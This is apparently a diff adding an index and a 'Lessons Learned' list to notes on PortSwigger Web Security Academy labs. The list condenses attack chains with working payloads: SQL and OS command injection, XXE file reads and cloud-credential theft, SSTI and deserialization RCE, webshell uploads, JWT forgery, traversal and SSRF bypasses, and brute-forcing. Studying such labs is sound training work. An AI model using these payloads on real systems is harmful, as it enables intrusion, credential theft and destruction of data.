+  - Labs: ssti-basic-erb-rce, ssti-code-context-tornado-rce, ssti-freemarker-execute-rce, ssti-handlebars-documented-rce, ssti-twig-custom-exploit-user-object
+- XXE → methodology/xxe.md
+  - Labs: xxe-external-entity-file-retrieval, xxe-ssrf-metadata-credentials, xxe-blind-oob-interaction, xxe-blind-oob-parameter-entities, xxe-svg-avatar-file-upload, xxe-xinclude-file-retrieval, xxe-blind-error-based-exfiltration, xxe-blind-oob-exfiltration-dtd, xxe-local-dtd-repurposing, xxe-targeted-scanning-stock-xinclude
+- Deserialization → methodology/deserialization.md
+  - Labs: deserialization-modifying-serialized-objects, deserialization-using-application-functionality, deserialization-java-apache-commons, deserialization-custom-gadget-chain-php, deserialization-custom-gadget-chain-java, deserialization-ruby-universal-gadget, deserialization-php-prebuilt-gadget-chain
+- JWT → methodology/jwt.md
+  - Labs: jwt-authentication-bypass-unverified-signature, jwt-authentication-bypass-flawed-signature-verification, jwt-authentication-bypass-weak-signing-key, jwt-authentication-bypass-jwk-header-injection, jwt-authentication-bypass-kid-header-path-traversal, jwt-authentication-bypass-jku-header-injection, jwt-authentication-bypass-algorithm-confusion, jwt-authentication-bypass-algorithm-confusion-no-exposed-key
+- XSS → methodology/xss.md
+  - Labs: xss-scanning-non-standard-data-structures
+- OAuth → methodology/oauth-sso.md
+  - Labs: oauth-authentication-bypass-implicit-flow, oauth-forced-profile-linking
+- Info disclosure → methodology/reconnaissance.md
+  - Labs: info-disclosure-error-messages-framework-version, info-disclosure-debug-page-secret-key, info-disclosure-backup-files-source-code, info-disclosure-version-control-history
+- Race conditions → methodology/race-conditions.md
+  - Labs: race-conditions-limit-overrun, race-conditions-bypassing-rate-limits, race-conditions-multi-endpoint, race-conditions-single-endpoint
+- CSRF → methodology/csrf.md
+  - Labs: csrf-no-defenses
+
+## Lessons Learned
+
+- WHERE-clause string-literal injection: differential testing sequence (baseline → `'` → `' OR 1=1` → `' OR 1=1 --`) maps the injection context; 500-vs-200 between tautology payloads reveals trailing SQL; tautology + comment bypasses visibility flags (e.g., `released = 1`). See methodology/injection.md.
+- Login bypass: credential queries are WHERE clauses — `administrator'--` comments out the password condition; targeted known-user bypass beats blanket tautology; verify authenticated session state (302 + account page), not just response changes. See methodology/injection.md.
+- UNION extraction: NULL-increment column discovery → rendered-column test → payload substitution; Oracle needs `FROM dual` and `v$version`; DB-specific syntax acceptance fingerprints the backend. See methodology/injection.md.
+- Comment syntax varies per instance (`--` vs `#`): isolate failure variables via empty-comment test (`x'--` vs `x'#`) before blaming the payload. See methodology/injection.md.
+- Schema enumeration: `information_schema` (non-Oracle) vs `all_tables`/`all_tab_columns` (Oracle); enumerate metadata before extraction — randomized identifiers make guessing useless; concatenate fields (`||`/`CONCAT`) with a separator when only one column renders. See methodology/injection.md.
+- OS command injection: shell-error names sink (`stockreport.sh: line 5`) → `|echo MARKER` maps appended trailer → output gated on exit-0 → `1|cat /etc/passwd #` comments trailer → full passwd + `is-solved`. `id <int>` is legal — not breakage evidence. See methodology/injection.md.
+- OS command blind time: session-bound baseline 0.34s → feedback email `; sleep 10 #` → 10.4s (`&` agrees, `|` negative) → `is-solved` on delay alone. Bind session before timing. See methodology/injection.md.
+- OS command blind redirect: sleep-proof (8.4s) → `whoami > /var/www/images/out1.txt` → fetch → user + listings → `is-solved` with no secret needed. Marker-check per rung. See methodology/injection.md.
+- OS command blind OOB: session-bound feedback → `; nslookup <unique>.burpcollaborator.net #` → 60s wait → `is-solved` by attribution. DNS-only cheapest; Collaborator-only egress. See methodology/injection.md.
+- Access-control cookie flip: denial baseline (`/admin` → 401) → login (`wiener:peter` → `Set-Cookie: Admin=false`) → single-variable flip (`Admin=true`, same session) → 200 + `delete?username=carlos` → delete → `is-solved`. Verify via victim state change, not status alone. See methodology/access-control.md.
+- Access-control method bypass: `/admin*` 401 on all verbs → discover `/admin-roles` (GET→400-validation vs POST→401-block proves verb-scoped filter) → matrix verbs × query/body (PUT reads body) → `PUT` body `username=wiener&action=upgrade` → fresh login → `GET /admin` 200 + `wiener (ADMIN)` + `is-solved`. 302 ≠ effect. See methodology/access-control.md.
+- Access-control confirm-step skip: `/admin-roles` GET+POST uniformly 401 (no verb gap) → `POST username+action` 401 vs same + `confirmed=true` 302 → fresh login → `GET /admin` 200 + `wiener (ADMIN)` + `is-solved`. Guarded-step vs confirm-step one-flag delta. See methodology/access-control.md.
+- Access-control URL desync: `GET /admin` 403-15B; path matrix 403/404 (`/admin/.%2e` → 200-homepage proves desync) → `GET /` + `X-Original-URL: /admin` → 200-panel + delete links → `GET /?username=carlos` + `X-Original-URL: /admin/delete` → 302 + `is-solved` + `User deleted successfully!`. Path in header, params in query. See methodology/access-control.md.
+- Access-control Referer gate: panel + delete 401 under all Referer values → `POST /admin-roles (username+action)` + `Referer: <lab>/admin` → 302 vs own-URL/root → 401 → fresh login → `GET /admin` 200 (Referer-free) + `wiener (ADMIN)` + `is-solved`. Gate lives on mutation, exact panel URL trusted. See methodology/access-control.md.
+- Access-control horizontal IDOR: own GUID → own API key; carlos GUID leaked in blog author links → swapped id → 200 carlos key → `POST /submitSolution` → `{"correct":true}` + `is-solved`. Leak-hunt, never guess GUIDs. See methodology/access-control.md.
+- Access-control IDOR password chain: username ids render 200 with cleartext passwords in input values → carlos-login valid but unsolved → administrator-login → `/admin` 200 → delete carlos → `User deleted successfully!` + `is-solved`. Source-inspect; solved-marker arbitrates. See methodology/access-control.md.
+- Authentication subtle-enumeration: normalized diffs/timing(n=20)/lockout(15×)/headers all identical → byte-EXACT scan of 101 usernames → only `americas` returns `…password ` (trailing space vs period) → 100-password scan → only `moon` 302s → login → account page + `is-solved`. Never normalize oracle bytes; enumerate-first beats cluster bomb. See methodology/authentication.md.
+- Authentication overt-enumeration: 101-username scan with fixed wrong password → 100× `Invalid username`, only `agenda` → `Incorrect password` (administrator/wiener/carlos all invalid – no anchoring) → 100-password scan → only `princess` 302s → login → identity render + `is-solved` on authenticated homepage (account page alone still `is-notsolved`). Exact-message compare; Academy `<code>` lists (101+100); 201 requests. See methodology/authentication.md.
+- Authentication 2FA-logic: naive `verify=carlos` swap fails (code binds to parameter identity) → `GET /login2?verify=carlos` mints victim code → unthrottled 0000–9999 (15 threads) → exactly one 302 (`1402`) → `/my-account?id=carlos` + `is-solved`. Single explicit Cookie headers only; generation precedes guessing. See methodology/authentication.md.
+- Authentication 2FA-skip: fresh stage-1 session → `GET /my-account?id=<stage-1-user>` 200 without `/login2` (no gate); cross-account → 302 (ownership holds); `verify` cookie/query ignored, body 500s (no confusion vector); 100-password carlos scan all-200 → description creds `carlos:montoya` → victim page + `/` `is-solved`. Skip-first, then victim stage-1. See methodology/authentication.md.
+- Authentication reset-binding: own reset mints token (email link) → reset form splits token + editable `username` → own token + `username=carlos` + attacker password → 302 → victim login 302 + session → identity render + `/` `is-solved`. Token validity ≠ binding; reset-302 = acceptance, login-302 = effect. See methodology/authentication.md.
+- Authentication IP-block bypass: 3-strike IP counter reset by ANY successful login → strictly-sequential 2× victim + 1× own-valid cycling over 100 passwords (50/50 resets, zero blocks) → single carlos 302 (`ranger`) → identity render + `/` `is-solved`. Concurrency scrambles fail/reset order. See methodology/authentication.md.
+- Authentication timing enumeration: 128-char password amplifies hash-delay oracle (100 users 0.276–0.366s vs `apache` 0.918s, 6-sample median 0.877s vs controls) → single 302 (`dragon`) → identity render + `/` `is-solved`. XFF rotation partitions IP counters (one paired ±XFF probe proves it); never poll a block. See methodology/authentication.md.
+- Authentication encryption oracle: comment error path encrypts email into `notification` + decrypts it for display → own-cookie decrypt gives `username:timestamp` → padded ECB excision forges administrator → sessionless login → delete carlos → `is-solved`. NoRedirect capture; decrypt-verify before use. See methodology/authentication.md.
+- Authentication reset poisoning: forwarding headers ignored + no username field → Host-spoofed victim reset (SNI/Host split) → victim click in access log → sub-60s submit → carlos login → `is-solved`. Stale tokens mimic broken submits; baseline creds first. See methodology/authentication.md.
+- Authentication 2FA cookie-mint: query-mint may refresh only the session user (fresh code works as self, never as victim) — verify mint vector per instance via inbox deltas, then cookie-keyed mint + sessionless brute-force (`0048` in 17s). Garbage-session + valid-code 302 proves sessionless verification. See methodology/authentication.md.
+- Authentication stay-logged-in forgery: unsigned `base64(username:md5(password))` token (decode + recompute match on known account) → offline forge per wordlist → single identity render (`carlos:george`) → `is-solved`. GET-only: zero failed logins. See methodology/authentication.md.
+- JWT unverified signature: claim-only `sub`→administrator forgery (signature untouched) → admin panel → delete carlos → `is-solved` in 7 requests. Test absent-verification before alg/kid machinery. See methodology/jwt.md.
+- JWT flawed verification: claim-only → 401 (verification present) → `alg:none` + empty signature → admin → delete carlos → `is-solved` in ~9 requests. H1/H2 differential fingerprints verification without key material. See methodology/jwt.md.
+- JWT weak signing key: claim-only 401 + alg:none 401 → quick-list miss → `hashcat -m 16500` + rockyou → `secret1` → valid signature → admin → delete carlos → `is-solved`. Crack fully offline. See methodology/jwt.md.
+- JWT jwk header injection: claim-only/alg-none/loose-JWK 401s → strict-shape embedded JWK (kid agreement, fresh oct key, HS256 self-sign) → admin → delete carlos → `is-solved` in ~12 requests. Fresh key per variant; body verdicts. See methodology/jwt.md.
+- JWT kid header path traversal: claim-only/alg-none 401s → `kid:../../../dev/null` + empty-key HS256 → admin → delete carlos → `is-solved` in ~9 requests. 401→200 depth boundary reveals keydir depth. See methodology/jwt.md.
+- JWT jku header injection: claim-only/alg-none 401s → own RSA keypair + serve-verified hosted JWKS + `jku` with `kid` agreement + RS256 self-sign → admin → delete carlos → `is-solved`. Prepare attacker infrastructure before forging. See methodology/jwt.md.
+- JWT algorithm confusion: claim-only/alg-none 401s → `/jwks.json` public key + HS256 with PEM bytes (DER 401) → admin → delete carlos → `is-solved` in ~13 requests. 401/401/200/401 two-axis oracle. See methodology/jwt.md.
+- JWT algorithm confusion with no exposed key: 8 falsifications → GCD recovery from 2 signatures (gmpy2; dual-token EM validation) → PEM-envelope HS256 confusion → admin → delete carlos → `is-solved`. Pure-Python big-int infeasible at this scale. See methodology/jwt.md.
+- OAuth implicit flow email confusion: username-spoof → wiener render (falsified), garbage-token → 500 (oracle), victim-email + own token → carlos render + `/` `is-solved` in ~12 requests. Field-authority matrix, one axis at a time. See methodology/oauth-sso.md.
+- OAuth forced linking: stateless attach URL (no `state`) → mint own code, stop before redeem → CSRF page auto-navigates victim session to `/oauth-linking?code=<own>` → victim binds attacker IdP identity → identical self-login flips from shadow identity to `administrator` → `/admin/delete?username=carlos` → 302 → re-read `is-solved`. Prove negative first; poll exploit `/log` for victim UA; re-loop on expiry. See methodology/oauth-sso.md.
+- Info disclosure version banner: quote probe on integer param → verbose Java trace (quiet 404s elsewhere) → version string sits LAST past 30+ frames → submit verbatim → `correct:true` + `is-solved` in ~6 requests. Read traces to the end. See methodology/reconnaissance.md.
+- Info disclosure debug page: 13-path sweep → `/cgi-bin/phpinfo.php` 200/69KB → secret-pattern grep → `SECRET_KEY` → submit verbatim → `correct:true` + `is-solved` in ~17 requests. Full-body reads; cross-lab link to deserialization key-recovery. See methodology/reconnaissance.md.
+- Info disclosure backup files: robots advertises `/backup` → listing → `.bak` Java source → DB password → submit verbatim → `correct:true` + `is-solved` in ~16 requests. `Disallow` entries top the sweep list. See methodology/reconnaissance.md.
+- Info disclosure version control: logs-first (deletion-marker commit) → object-graph walk (commits→trees→blobs, exact-SHA parsing) → `ADMIN_PASSWORD` → administrator login → delete carlos → `is-solved` in ~20 requests. Deletion commits are pointers. See methodology/reconnaissance.md.
+- Access-control TRACE-header bypass: seeded creds rejected → `/admin` 401 local-only → `TRACE` echo discloses `X-Custom-IP-Authorization` → `127.0.0.1` spoof → admin → delete carlos → `is-solved` with zero authentication. Brute-force correctly killed first. See methodology/access-control.md.
+- Scanning non-standard data structures (stored XSS in session-cookie username half): tamper → 500 integrity error, yet stored → blind victim-side `fetch` deletes carlos (no receiver) → `is-solved` in 8 requests. See methodology/xss.md.
+- Business-logic price trust: product form hides `price=133700` (cents) → `POST /cart` with `price=100` renders cart Total `$1.00` → legitimate login + csrf checkout → confirmation Total `$1.00`, credit `$100→$99`, `is-solved`. Prove with charged total + balance delta. See methodology/business-logic.md.
+- Business-logic workflow replay: no price field (server pricing, quantities capped, funds checked) → cheap E2E baseline maps charge to confirmation visit → add jacket → replay confirmation GET → $1337 order, $0 additional charge, `is-solved`. Take redirect targets from live responses. See methodology/business-logic.md.
+- Business-logic inconsistent writers: verified registration (token link) vs `POST /my-account/change-email` to `@dontwannacry.com` with no verification → instant Admin panel → delete carlos → `is-solved`. Paired same-input/different-endpoint proof. See methodology/business-logic.md.
+- Business-logic dual-use: change-password with editable `username`; wrong `current-password` → `incorrect` but DROPPED field → `Password changed successfully!` for carlos then administrator → logins → `/admin` 200 → delete carlos → `is-solved`. Matrix guard presence. See methodology/business-logic.md.
+- Business-logic mixed-sign: negative `quantity` stored (`-$63.27`), negative-only checkout blocked (`NEGATIVE_TOTAL`), no coupon reachable → arithmetic on paper (jacket×1 + cheap×−21) → Total `$8.33` → legitimate checkout → charged `$8.33`, credit `$100→$91.67` → `is-solved`. Rejected guards design bypasses. See methodology/business-logic.md.
+- Business-logic coupon alternation: `NEWCUST5` single-use holds, negatives ignored, replay 400, funds verified — newsletter `SIGNUP30` + A,B,A,B cycling stacks to `$0.00` → free order, credit untouched → `is-solved`. Per-application totals prove stacking. See methodology/business-logic.md.
+- Business-logic integer overflow: quantities 1–99 only → repeated 99-adds wrap 32-bit cents at ~$21.47M → computed cheap-item top-up → `$0.69` charge, credit `$100→$99.31` → `is-solved`. Predict landmarks arithmetically; file-backed sessions. See methodology/business-logic.md.
+- Business-logic email parsing discrepancy: exact-domain + format gates mapped → UTF-7 `&AEA-`/`&ACA-` encoded-word → verification mail arrives → privileged account → delete carlos → `is-solved`. Gate-mapping precedes the ladder. See methodology/business-logic.md.
+- Business-logic truncation split: separators/duplicates/encodings mapped (LAST-wins insufficient) → 238+17@cut address → token arrives + stored privileged role → delete carlos → `is-solved`. Verify cut arithmetic in code. See methodology/business-logic.md.
+- Business-logic state skip: unlisted role → homepage, skip/anon → bounce/400 — but dropped role-selector GET (redirects off) → default administrator → delete carlos → `is-solved`. Auto-follow falsifies true theories; omission is a third axis. See methodology/business-logic.md.
+- Business-logic gift arbitrage: redemption repeat/race/case all enforced — but discounted buy ($7) + full redeem (+$10) nets +$3/cycle, bulk-compounded $103→$1438 → jacket → `is-solved`. Test composition, not halves. See methodology/business-logic.md.
+- SSRF loopback: stockApi external → `54` vs `http://127.0.0.1/` → reflected homepage → `/admin` → delete links → delete-URL → 302 → re-read `User deleted successfully!` + `is-solved`, all anon. See methodology/ssrf.md.
+- SSRF backend range: form URLs reference `192.168.0.1:8080` → /24 sweep (threads) → 254× uniform 500/2454B vs `.170:8080/admin` 200/3245B admin → delete → re-read success + `is-solved`. Content oracles; adopt form port/path. See methodology/ssrf.md.
+- SSRF blacklist bypass: `127.0.0.1` → 400-block → host matrix → only `127.1` passes → `/admin` also filtered → case matrix → `/Admin` passes → panel → delete → re-read success + `is-solved`. Matrix host × path independently. See methodology/ssrf.md.
+- SSRF whitelist double-decode: strict host whitelist (~30 single-decode/redirect probes eliminated) → `http://localhost:80%2523@stock…/admin/delete?username=carlos` RAW → 302 → re-read success + `is-solved`. Loopback-first; `--data` not `--data-urlencode`. See methodology/ssrf.md.
+- SSRF open-redirect chain: relative-only stockApi + open `nextProduct?path=` (302 arbitrary confirmed) → benign-follow control → loopback absent → /24 sweep via redirector → single hit `192.168.0.12:8080/admin` → delete → re-read + `is-solved`. See methodology/ssrf.md.
+- SSRF blind OOB: no reflected surface; Referer/Origin/UA → identical 200s, zero hits on health-checked webhook (firewall = Collaborator-only) → Collaborator Referer + 90s async wait → `is-solved` by attribution. Control receiver/vector/timing separately. See methodology/ssrf.md.
+- API unused-endpoint: JS `productPrice.js` → `GET /api/products/1/price` 200 → method matrix 405/405/401/405 singles PATCH → authed `PATCH {"price":0}` → global `$0.00` → remove/re-add refreshes snapshot → checkout + confirmation → `is-solved` on $0 credit. See methodology/api-security.md.
+- API docs-driven delete: 13-path docs sweep → only `/api/openapi.json` 200/2096B → contract `DELETE /user/{username}` + base `./` → safe-read GET 200 → low-priv DELETE 200 → re-read 404 + `is-solved`, no fuzzing. See methodology/api-security.md.
+- API SSPP query-string: oracle users + parser matrix (`&unknown` rejected, dups first-wins, `#` truncates, NUL 500s) → `&field=x#` isolates combination → page JS names `reset_token` → `field=reset_token#` leaks admin token → reset → login → delete → `is-solved`. See methodology/api-security.md.
+- API mass assignment: GET/POST JSON shape diff → hidden `chosen_discount` → benign silent, wrong-type errors, `100` → 201 + confirmation + `is-solved`. Intercept this lab's checkout traffic first. See methodology/api-security.md.
+- API SSPP REST URL: `..`-depth ladder attributes layers → escaped `openapi.json` discloses versioned field path → `field/passwordResetToken` leaks admin token → reset → login → delete → `is-solved`. Field names vary per lab. See methodology/api-security.md.
+- File-upload webshell: benign PNG baseline (stored-path oracle) → plain `.php` unblocked → `/files/avatars/shell.php?cmd=id` → `uid=…(carlos)` → `/home/carlos/secret` → submit → `{"correct":true}` + `is-solved`. Cheapest shell first; match verb to construction. See methodology/file-security.md.
+- File-upload MIME bypass: octet-stream → 403 naming `image/jpeg|image/png` → identical bytes as `image/png` → stored executable → same RCE chain → submit → `is-solved`. Per-form csrf; vary ONLY Content-Type. See methodology/file-security.md.
+- File-upload traversal: no filter but `avatars/` serves static → `filename=..%2fmarker.php` echoes `avatars/../marker.php` → `/files/marker.php?cmd=id` → `uid=…` → secret → submit → `is-solved`. Placement decides execution. See methodology/file-security.md.
+- File-upload null-byte: 7 extension variants → identical 403 → `shell.php%00.png` (hand multipart) stored TRUNCATED as `shell.php` (vs `%2500` literal) → same RCE chain → submit → `is-solved`. Exactly-one-decode gap. See methodology/file-security.md.
+- File-upload blacklist gap: `php files are not allowed` → `.phtml` blocked but `.phar`+`.pht` upload → only `.phar` EXECUTES (`uid=…`, `.pht` static) → secret → submit → `is-solved`. Prove execution per candidate. See methodology/file-security.md.
+- File-upload polyglot: plain PHP → 403 `not a valid image` → `GIF89a`+PHP → stored + executes (`uid=…` beside prologue) → unstripped secret `false`, stripped 32-char `true` + `is-solved`. Frame-strip exfiltration. See methodology/file-security.md.
+- File-upload race: all sync families 403 (TOCTOU pairs 404) → upload + 10 parallel GETs × 6 → 49 `uid=` hits among 404s → raced secret → `{"correct":true}` + `is-solved`. 403 lies; parallelism mandatory. See methodology/file-security.md.
+- Traversal read: baseline image (200 + jpeg + size) → clean single-param `..%2f`×3 → 200 `root:x:0…` + `is-solved`. Duplicate-param contamination mimics filters — build URLs literally. See methodology/traversal.md.
+- Traversal absolute bypass: `..%2f`×3 → 400 `No such file` → absolute `/etc/passwd` → 200 `root:x:0…` + `is-solved` in 4 requests. Read bypass off the block. See methodology/traversal.md.
+- Traversal nested strip: `..%2f`×3 → 400 (strip, not block) → nested `....%2f%2f`×3 → 200 `root:x:0…` + `is-solved` in 4 requests. Sanitizer behavior dictates shape. See methodology/traversal.md.
+- Traversal prefix allowlist: legitimate absolute `/var/www/images/…` → prefix + `/../../../etc/passwd` → 200 `root:x:0…` + `is-solved` in 3 requests. Satisfy-then-escape. See methodology/traversal.md.
+- Traversal extension + null: bare `/etc/passwd` → 400 (gate) → absolute+null → 400 (relative required) → `..%2f`×3 + `%00.jpg/.png` → 200 `root:x:0…` + `is-solved`. Compose null with depth; axes independent. See methodology/traversal.md.
+- Deserialization admin flip: `POST /login wiener:peter` → `session=base64(PHP O:4:"User":2:{...admin b:0})` → decode → `b:0→b:1` (length-safe) → re-encode → `GET /my-account` gains Admin link → `GET /admin` 200 user list → `GET /admin/delete?username=carlos` 302 → `is-solved`. No HMAC segment = no integrity. See knowledge/portswigger/labs/deserialization-modifying-serialized-objects.md.
+- Deserialization file-action: `O:4:"User":3:{...avatar_link s:19}` → `s:23:"/home/carlos/morale.txt"` (exact byte count) → re-encode → `POST /my-account/delete` 302 + session cleared → `is-solved`. Shape dictates sink – decode first, map delete/upload features, then edit. See methodology/deserialization.md.
+- Deserialization Java CC4: `rO0A...AccessTokenUser` → `ysoserial CommonsCollections4 'rm /home/carlos/morale.txt'` (Java 16+ needs `--add-opens` trax/runtime/net/util) → base64 → URL-encode as session → `GET /my-account` → 500 trigger → `/` `is-solved`. 500 ≠ failure for RCE-delete. See methodology/deserialization.md.
+- Deserialization custom PHP gadget: HTML comment → `/cgi-bin/libs/CustomTemplate.php~` reveals `__wakeup→$desc->$cmd` + `__get→call_user_func(exec)`; graph `CustomTemplate(cmd, DefaultMap(exec))` → session → 500 trigger → `is-solved`. Source-driven; local `product=N` harmless. See methodology/deserialization.md.
+- Deserialization custom Java gadget: HTML comment → `/backup/*.java` reveals `ProductTemplate.readObject` SQLi; Python-mirrored `ProductTemplate` bytes (no JDK) → `'` leaks query → 8-NULL UNION flips `PSQLException`→`ClassCastException` → `CAST(password AS numeric)` reflects password → admin login → delete carlos → `is-solved`. Exception type is the oracle. See methodology/deserialization.md.
+- Deserialization Ruby universal gadget: `BAhv` Marshal session → vakzz chain (`Requirement→TarReader→TarHeader→BufferedIO→WriteAdapter→RequestSet→Kernel.system`, autoload pragmas) → session → 500 with `sh: 1: reading: not found` + `net/protocol.rb system` frame (server Ruby 2.7.0) → `is-solved`. `sh: reading` = success artifact; check version range (≤3.0.2). See methodology/deserialization.md.
+- Deserialization signed PHP + pre-built chain: `{"token","sig_hmac_sha1"}` session → phpinfo `SECRET_KEY` → HMAC recompute matches (oracle first) → `Monolog/RCE1` fails usefully (`Invalid user` + `Symfony 4.3.6`) → `phpggc Symfony/RCE4` (4.3.0-7) signed → 500 → `is-solved`. Range-match beats habit. See methodology/deserialization.md.
+- SSTI basic ERB: `/?message={{7*7}}` literal → `/?message=<%= 7*7 %>` renders `49` → `<%= system('rm /home/carlos/morale.txt') %>` renders `true` → `/` `is-solved`. Syntax matrix first (Twig→ERB), RCE only in winning syntax, anon. See methodology/ssti.md.
+- SSTI code context (Tornado): stored preference → comment author `{{49}}`-artifact → 500 names `tornado/template.py` → bare `7*7` renders clean `49` → `__import__('os').system('rm ...')` renders `0` → `is-solved`. Slot is the expression; error forensics over retry. See methodology/ssti.md.
+- SSTI docs-driven (Freemarker): `content-manager` role → editor `${product.*}` fingerprint → Preview `${7*7}`→`49` → `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm ...") }` on Preview render alone → `is-solved`. Preview is oracle AND trigger. See methodology/ssti.md.
+- SSTI unknown language (Handlebars): `message={{7*7}}` → 500 `handlebars/.../parser.js` (Node v19.8.1) → `{{"PROBE"}}` empty (logic-less, expected) → documented `#with`/`lookup`/`apply`→`constructor` chain + `child_process.exec(rm)` URL-encoded → `is-solved` on load. Fuzz-then-read-500; helper chains from docs. See methodology/ssti.md.
+- SSTI custom object chain (Twig): stored preference + `user` object → invalid upload leaks `setAvatar(path,mime)` + `User.php` → `/etc/passwd` via avatar endpoint (read primitive) → source reveals symlink-plant + `gdprDelete()` → point at `/home/carlos/.ssh/id_rsa` + invoke → `is-solved`. Read→source→delete; 500 on destructive render is normal. See methodology/ssti.md.
+- XXE external entity: baseline `productId=1` → `551` → DOCTYPE `<!ENTITY xxe SYSTEM "file:///etc/passwd">` + `&xxe;` in `productId` → `400 Invalid product ID: root:x:0...` (full file) → `/` `is-solved`. Reflected-error slots exfiltrate on 400; `FileNotFoundException` (vs parser rejection) means resolution works, path wrong. See methodology/xxe.md.
+- XXE→SSRF metadata: same slot, `http://169.254.169.254/` entity → `latest` → `iam` → `security-credentials` → `admin` → credentials JSON in errors → `/` `is-solved`. Consume listings rung-by-rung; record keys as evidence. See methodology/xxe.md.
+- XXE blind OOB: `file://` entity → generic `Invalid product ID` (blind-but-parsed) → `http://<unique>.burpcollaborator.net` entity → `XML parsing error` on trigger (non-oracle) → 65s wait → `/` `is-solved`. Fresh subdomain per attempt; marker arbitrates. See methodology/xxe.md.
+- XXE blind OOB parameter entities: general references blocked (`Entities are not allowed`) → `<!ENTITY % xxe SYSTEM "http://<unique>/">` + `%xxe;` in DOCTYPE (NO space, clean body) → `XML parsing error` → 70s wait → `/` `is-solved`. Spaced `% xxe;` never fetches – validate grammar before waiting. See methodology/xxe.md.
+- XXE SVG avatar upload: entity SVG (`file:///etc/hostname`, white fill) → Batik PNG (765px vs 326px control proves resolution) → enlarged visual read → bracketed re-render `[hostname]` proves completeness → form-encoded submit → `{"correct":true}` → `is-solved`. Pixels as exfil; JS contract first. See methodology/xxe.md.
+- XXE XInclude (no DOCTYPE): form-encoded stock endpoint (read builder FIRST – `URLSearchParams`, not XML) → in-value `<foo xmlns:xi=...><xi:include parse="text" href="file:///etc/passwd"/></foo>` → `400 Invalid product ID: root:x:0...` → `is-solved`. Builder-shape match beats DOCTYPE habit. See methodology/xxe.md.
+- XXE blind error-exfil: body refs blocked → STORE external DTD (`%file`/`%eval`/`%exfil` trio, verify served bytes) → clean-body reference → `FileNotFoundException: /nonexistent/<file>` → `is-solved`. Errors as exfil channel; forms POSTable directly, no browser needed. See methodology/xxe.md.
+- XXE blind OOB exfil: same block → exfil-DTD (`/exfil?x=%file;`) STORE-verified → trigger → backend DTD fetch logged BUT no exfil follow-up for guessed secret path (wrong PATH, not broken channel) → re-STORE with `/etc/hostname` → log `GET /exfil?x=<value>` → submit → `{"correct":true}` → `is-solved`. Known-file channel proof before secret guesses; `GET /log` as oracle. See methodology/xxe.md.
+- XXE local DTD repurposing: NO exploit server → include-alone `docbookx.dtd` parses → redefine `%ISOamso;` EXACTLY (not `ISOamsa`) with fully-nested `&#x25;`/`&#x27;`-escaped chain + `<!DOCTYPE message` + newlines (machine-measured length) → `FileNotFoundException` embeds file → `is-solved`. Exactness on name/escapes/lengths; hand counts + wrong names breed phantom parser rules. See methodology/xxe.md.
+- Host-header locality bypass: `GET /robots.txt` → `Disallow: /admin`; `GET /admin` true Host → 401 `only available to local users`; same path + `Host: localhost` (HTTP/1.1 SNI/Host split, sessionless) → 200 panel + delete links; `GET /admin/delete?username=carlos` same Host → 302 → re-read → `User deleted successfully!` + carlos absent + `is-solved` in 5 Burp requests. See methodology/access-control.md.
+- Race limit-overrun: single-use coupon idempotent sequentially ($1069.60) and capped at 2–3 stacks under H1-thread bursts; pristine-reset per round + h2-multiplexed 40× burst → ~16 stacks → $37.62 → checkout 303 → confirmation GET → `is-solved`, credit $50→$12.38. Closed-form totals (0.8^n) as win-counter. See methodology/race-conditions.md.
+- Race rate-limit bypass: per-username 3-strike/60s lock (countdown) → h2 single-packet 30-password burst → exactly one 302 (`qwerty`, rest 200/400) → wait out lock → clean login → `carlos` → admin → delete → `is-solved`. Atomic stream IDs; bytes header keys; shared csrf. See methodology/race-conditions.md.
+- Race multi-endpoint: redeem×redeem atomic (single 302) → paired h2 [checkout + add-jacket] from $10 cart → commit body shows jacket, $1347 confirmed → `is-solved`, credit -$1247. Delta cart ops; gift loops fund probes. See methodology/race-conditions.md.
+- Race single-endpoint: barrier-paired email changes [own + victim] → inbox To: own + body: victim + live token → click → victim address + admin → delete → `is-solved`. Two threads suffice. See methodology/race-conditions.md.
+- CSRF no defenses: tokenless email POST proven on self (302 + re-read) + `SameSite=None` session → minimal auto-submit → store/verify/deliver (real body — deliver re-stores) → victim UA + `is-solved` (~15 min cycle). See methodology/csrf.md.
